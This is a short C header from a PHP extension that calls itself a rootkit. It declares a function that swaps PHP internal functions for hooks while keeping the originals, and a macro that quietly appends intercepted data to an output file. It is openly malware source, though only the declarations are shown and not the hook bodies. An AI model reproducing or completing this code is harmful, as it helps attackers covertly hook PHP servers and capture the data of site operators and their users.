#ifndef ROOTKIT_HOOK_H
#define ROOTKIT_HOOK_H

#include "php.h"
#include "rootkit_config.h"

bool rootkit_hook_function(
	const char* method_name,
	void (*hook)(INTERNAL_FUNCTION_PARAMETERS),
	void (**original)(INTERNAL_FUNCTION_PARAMETERS)
);

#define rootkit_write_output(format, args...)                 \
	FILE *output = fopen(ROOTKIT_INTERCEPT_OUTPUT, "a+"); \
	fprintf(output, format, ## args);                     \
	fclose(output);

#endif
